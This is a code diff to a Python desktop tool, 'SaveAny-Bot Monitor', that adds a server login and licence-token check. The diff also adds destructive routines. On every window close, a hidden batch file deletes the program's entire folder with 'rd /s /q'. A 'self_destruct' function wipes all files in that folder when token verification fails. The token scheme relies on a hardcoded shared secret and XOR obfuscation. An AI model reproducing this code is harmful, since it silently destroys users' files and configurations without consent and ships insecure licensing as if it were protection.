@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-SaveAny-Bot Monitor v2.7.1
+SaveAny-Bot Monitor v2.8
 监控 SaveAny-Bot 的运行状态、资源占用和网络流量
 支持配置文件编辑、Web 网页查看、日志捕获和下载任务列表
 针对 Windows Server 2025 优化
@@ -23,6 +23,14 @@ from datetime import datetime, timedelta
 from collections import deque
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import parse_qs, urlparse
+import re
+
+# 导入认证模块
+try:
+    from auth_module import LicenseManager, AccountManager, encrypt_data, decrypt_data, hash_password, generate_salt
+    AUTH_AVAILABLE = True
+except ImportError:
+    AUTH_AVAILABLE = False
 
 # 全局变量用于 Web 服务
 monitor_data = {
@@ -645,7 +653,7 @@ class MonitorHTTPHandler(BaseHTTPRequestHandler):
 class SaveAnyMonitor:
     def __init__(self, root):
         self.root = root
-        self.root.title("SaveAny-Bot Monitor v2.7.1")
+        self.root.title("SaveAny-Bot Monitor v2.8")
         self.root.geometry("750x700")
         self.root.resizable(True, True)
         self.root.minsize(650, 600)
@@ -2288,6 +2296,41 @@ base_path = "{base_path}"\n'''
         except Exception:
             pass
     
+    def delete_self_on_exit(self):
+        """关闭时删除程序自身"""
+        import shutil
+        import subprocess
+        try:
+            if getattr(sys, 'frozen', False):
+                # PyInstaller 打包后的 exe
+                exe_path = sys.executable
+                app_dir = os.path.dirname(exe_path)
+                
+                # 创建一个延迟删除的批处理文件
+                bat_path = os.path.join(os.environ.get('TEMP', '.'), 'cleanup_saveany.bat')
+                bat_content = f'''@echo off
+:loop
+tasklist /FI "PID eq {os.getpid()}" | find "{os.getpid()}" >nul
+if not errorlevel 1 (
+    timeout /t 1 /nobreak >nul
+    goto loop
+)
+timeout /t 2 /nobreak >nul
+rd /s /q "{app_dir}"
+del "%~f0"
+'''
+                with open(bat_path, 'w') as f:
+                    f.write(bat_content)
+                
+                # 启动批处理文件（隐藏窗口）
+                subprocess.Popen(
+                    ['cmd', '/c', bat_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    shell=False
+                )
+        except Exception:
+            pass
+    
     def on_closing(self):
         self.running = False
         
@@ -2304,9 +2347,371 @@ base_path = "{base_path}"\n'''
                 pass
         
         self.root.destroy()
+        
+        # 关闭时删除程序自身
+        self.delete_self_on_exit()
+
+
+# 导入 urllib 用于 HTTP 请求
+import urllib.request
+import urllib.error
+import hashlib
+import hmac
+import base64
+
+# 配置文件路径
+LOGIN_CONFIG_FILE = 'login_config.ini'
+TOKEN_FILE = 'auth_token.dat'
+
+# 共享密钥（客户端和服务端必须一致）
+SECRET_KEY = b'SaveAny-Monitor-Auth-Key-2024-Secure'
+
+
+def self_destruct():
+    """自毁函数：清空当前文件夹并关闭应用"""
+    import shutil
+    try:
+        # 获取程序所在目录
+        if getattr(sys, 'frozen', False):
+            # PyInstaller 打包后的路径
+            app_dir = os.path.dirname(sys.executable)
+        else:
+            app_dir = os.path.dirname(os.path.abspath(__file__))
+        
+        # 删除目录下的所有文件和子目录
+        for item in os.listdir(app_dir):
+            item_path = os.path.join(app_dir, item)
+            try:
+                if os.path.isfile(item_path):
+                    os.remove(item_path)
+                elif os.path.isdir(item_path):
+                    shutil.rmtree(item_path)
+            except Exception:
+                pass
+    except Exception:
+        pass
+    finally:
+        # 强制退出程序
+        os._exit(1)
+
+
+def verify_token_signature(token):
+    """本地验证 token 签名，防止伪造服务器绕过验证"""
+    try:
+        # 解码 token
+        data = base64.b64decode(token.encode('utf-8'))
+        result = []
+        for i, b in enumerate(data):
+            result.append(b ^ (i % 256))
+        decoded = base64.b64decode(bytes(result))
+        full_data = json.loads(decoded.decode('utf-8'))
+        
+        # 验证签名
+        json_str = json.dumps(full_data['data'], ensure_ascii=False)
+        expected_sig = hmac.new(SECRET_KEY, json_str.encode('utf-8'), hashlib.sha256)
+        expected = base64.b64encode(expected_sig.digest()).decode('utf-8')
+        
+        if not hmac.compare_digest(expected, full_data.get('signature', '')):
+            return False, None
+        
+        # 检查 token 数据有效性
+        token_data = full_data['data']
+        if not token_data.get('valid', False):
+            return False, None
+        if not token_data.get('username'):
+            return False, None
+        
+        return True, token_data
+    except Exception:
+        return False, None
+
+
+def load_login_config():
+    """加载登录配置"""
+    config = {
+        'server_url': 'http://127.0.0.1:8899',
+        'username': '',
+        'remember': True
+    }
+    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), LOGIN_CONFIG_FILE)
+    if os.path.exists(config_path):
+        try:
+            with open(config_path, 'r', encoding='utf-8') as f:
+                for line in f:
+                    line = line.strip()
+                    if '=' in line:
+                        key, value = line.split('=', 1)
+                        key = key.strip()
+                        value = value.strip()
+                        if key == 'server_url':
+                            config['server_url'] = value
+                        elif key == 'username':
+                            config['username'] = value
+                        elif key == 'remember':
+                            config['remember'] = value.lower() == 'true'
+        except Exception:
+            pass
+    return config
+
+
+def save_login_config(server_url, username, remember):
+    """保存登录配置"""
+    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), LOGIN_CONFIG_FILE)
+    try:
+        with open(config_path, 'w', encoding='utf-8') as f:
+            f.write(f"server_url={server_url}\n")
+            f.write(f"username={username}\n")
+            f.write(f"remember={str(remember).lower()}\n")
+    except Exception:
+        pass
+
+
+def save_auth_token(token):
+    """保存认证 token"""
+    token_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), TOKEN_FILE)
+    try:
+        with open(token_path, 'w', encoding='utf-8') as f:
+            f.write(token)
+        return True
+    except Exception:
+        return False
+
+
+def load_auth_token():
+    """加载认证 token"""
+    token_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), TOKEN_FILE)
+    if os.path.exists(token_path):
+        try:
+            with open(token_path, 'r', encoding='utf-8') as f:
+                return f.read().strip()
+        except Exception:
+            pass
+    return None
+
+
+def verify_token_online(server_url, token):
+    """在线验证 token（先本地验证签名，再向服务器确认）"""
+    # 首先本地验证 token 签名
+    valid, token_data = verify_token_signature(token)
+    if not valid:
+        # 检测到伪造 token，触发自毁
+        self_destruct()
+        return False, '', 'Token 签名无效'
+    
+    username = token_data.get('username', '')
+    
+    # 然后向服务器确认账号状态（检查是否被禁用）
+    try:
+        url = f"{server_url.rstrip('/')}/api/validate_token"
+        data = json.dumps({'token': token}).encode('utf-8')
+        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
+        with urllib.request.urlopen(req, timeout=10) as response:
+            result = json.loads(response.read().decode('utf-8'))
+            if result.get('success', False):
+                return True, username, '验证成功'
+            else:
+                return False, '', result.get('message', '账号已被禁用或已删除')
+    except urllib.error.URLError as e:
+        # 服务器不可用时，仅依赖本地验证
+        return True, username, '离线模式（服务器不可用）'
+    except Exception as e:
+        return True, username, '离线模式'
+
+
+def verify_login_online(server_url, username, password):
+    """在线验证登录"""
+    try:
+        url = f"{server_url.rstrip('/')}/api/verify"
+        data = json.dumps({'username': username, 'password': password}).encode('utf-8')
+        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
+        with urllib.request.urlopen(req, timeout=10) as response:
+            result = json.loads(response.read().decode('utf-8'))
+            
+            if not result.get('success', False):
+                return False, '', result.get('message', '登录失败')
+            
+            token = result.get('token', '')
+            if not token:
+                return False, '', '服务器未返回有效 token'
+            
+            # 本地验证 token 签名，防止伪造服务器
+            valid, token_data = verify_token_signature(token)
+            if not valid:
+                # 检测到伪造 token，触发自毁
+                self_destruct()
+                return False, '', '无效的授权 token'
+            
+            # 验证用户名是否匹配
+            if token_data.get('username') != username:
+                # 用户名不匹配，触发自毁
+                self_destruct()
+                return False, '', 'Token 用户名不匹配'
+            
+            return True, token, '登录成功'
+    except urllib.error.URLError as e:
+        return False, '', f"连接服务器失败: {str(e.reason)}"
+    except Exception as e:
+        return False, '', f"登录失败: {str(e)}"
+
+
+class LoginWindow:
+    """登录窗口"""
+    
+    def __init__(self, root, on_success):
+        self.root = root
+        self.on_success = on_success
+        
+        self.root.title("登录 - SaveAny-Bot Monitor")
+        self.root.geometry("450x380")
+        self.root.resizable(False, False)
+        
+        # 居中显示
+        self.root.update_idletasks()
+        x = (self.root.winfo_screenwidth() - 450) // 2
+        y = (self.root.winfo_screenheight() - 380) // 2
+        self.root.geometry(f"450x380+{x}+{y}")
+        
+        # 加载配置
+        self.config = load_login_config()
+        
+        self.create_widgets()
+        
+        # 填充保存的配置
+        self.server_entry.insert(0, self.config['server_url'])
+        if self.config['username']:
+            self.username_entry.insert(0, self.config['username'])
+        self.remember_var.set(self.config['remember'])
+    
+    def create_widgets(self):
+        # 标题
+        title_frame = ttk.Frame(self.root)
+        title_frame.pack(pady=15)
+        
+        title_label = ttk.Label(title_frame, text="SaveAny-Bot Monitor", font=('Segoe UI', 16, 'bold'))
+        title_label.pack()
+        
+        subtitle_label = ttk.Label(title_frame, text="请登录以继续使用", font=('Segoe UI', 10))
+        subtitle_label.pack(pady=5)
+        
+        # 登录表单
+        form_frame = ttk.Frame(self.root)
+        form_frame.pack(pady=10, padx=40, fill='x')
+        
+        # 服务器地址
+        ttk.Label(form_frame, text="服务器地址:").pack(anchor='w')
+        self.server_entry = ttk.Entry(form_frame, width=40)
+        self.server_entry.pack(fill='x', pady=(0, 10))
+        
+        # 用户名
+        ttk.Label(form_frame, text="用户名:").pack(anchor='w')
+        self.username_entry = ttk.Entry(form_frame, width=40)
+        self.username_entry.pack(fill='x', pady=(0, 10))
+        
+        # 密码
+        ttk.Label(form_frame, text="密码:").pack(anchor='w')
+        self.password_entry = ttk.Entry(form_frame, width=40, show='*')
+        self.password_entry.pack(fill='x', pady=(0, 10))
+        
+        # 记住登录
+        self.remember_var = tk.BooleanVar(value=True)
+        remember_check = ttk.Checkbutton(form_frame, text="记住登录", variable=self.remember_var)
+        remember_check.pack(anchor='w', pady=5)
+        
+        # 登录按钮
+        btn_frame = ttk.Frame(self.root)
+        btn_frame.pack(pady=15)
+        
+        login_btn = ttk.Button(btn_frame, text="登录", command=self.login, width=15)
+        login_btn.pack(side='left', padx=5)
+        
+        exit_btn = ttk.Button(btn_frame, text="退出", command=self.root.destroy, width=15)
+        exit_btn.pack(side='left', padx=5)
+        
+        # 状态标签
+        self.status_label = ttk.Label(self.root, text="", foreground='gray')
+        self.status_label.pack(pady=5)
+        
+        # 绑定回车键
+        self.password_entry.bind('<Return>', lambda e: self.login())
+        self.username_entry.bind('<Return>', lambda e: self.password_entry.focus())
+        self.server_entry.bind('<Return>', lambda e: self.username_entry.focus())
+    
+    def login(self):
+        server_url = self.server_entry.get().strip()
+        username = self.username_entry.get().strip()
+        password = self.password_entry.get()
+        
+        if not server_url:
+            messagebox.showerror("错误", "请输入服务器地址")
+            return
+        
+        if not username or not password:
+            messagebox.showerror("错误", "请输入用户名和密码")
+            return
+        
+        # 显示登录中状态
+        self.status_label.config(text="正在连接服务器...", foreground='blue')
+        self.root.update()
+        
+        # 在线验证
+        success, token, message = verify_login_online(server_url, username, password)
+        
+        if success:
+            # 保存配置
+            if self.remember_var.get():
+                save_login_config(server_url, username, True)
+                save_auth_token(token)
+            else:
+                save_login_config(server_url, '', False)
+            
+            self.status_label.config(text="登录成功!", foreground='green')
+            self.root.update()
+            self.root.after(500, lambda: self._complete_login(username))
+        else:
+            self.status_label.config(text=message, foreground='red')
+    
+    def _complete_login(self, username):
+        self.on_success(username)
+        self.root.destroy()
 
 
 def main():
+    # 检查是否需要登录验证
+    need_login = True
+    
+    # 尝试使用保存的 token 自动登录
+    config = load_login_config()
+    token = load_auth_token()
+    
+    if token and config.get('server_url'):
+        # 尝试验证 token
+        success, username, msg = verify_token_online(config['server_url'], token)
+        if success:
+            need_login = False
+    
+    if need_login:
+        # 需要登录
+        login_root = tk.Tk()
+        
+        try:
+            from ctypes import windll
+            windll.shcore.SetProcessDpiAwareness(1)
+        except Exception:
+            pass
+        
+        logged_in_user = [None]
+        
+        def on_login_success(username):
+            logged_in_user[0] = username
+        
+        login_window = LoginWindow(login_root, on_login_success)
+        login_root.mainloop()
+        
+        if logged_in_user[0] is None:
+            # 用户取消登录
+            return
+    
+    # 启动主程序
     root = tk.Tk()
     
     try:
